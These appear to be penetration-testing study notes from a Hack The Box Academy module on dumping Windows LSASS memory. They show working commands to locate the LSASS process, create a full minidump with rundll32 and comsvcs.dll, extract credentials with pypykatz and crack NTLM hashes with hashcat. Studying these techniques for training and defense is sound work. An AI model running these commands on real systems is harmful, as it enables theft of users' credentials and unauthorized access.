# Task Manager Method
![Alt text](https://academy.hackthebox.com/storage/modules/147/taskmanagerdump.png)

### C:\Users\loggedonusersdirectory\AppData\Local\Temp
#### File dump "lsass.DMP"

# Rundll32.exe & Comsvcs.dll Method

1a. Finding LSASS PID in cmd
```powershell
    C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A

```


1b. Finding LSASS PID in PowerShell
```powershell
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

2. Creating lsass.dmp using PowerShell
```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

# Using Pypykatz to Extract Credentials

```bash
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```
```bash
sudo hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
```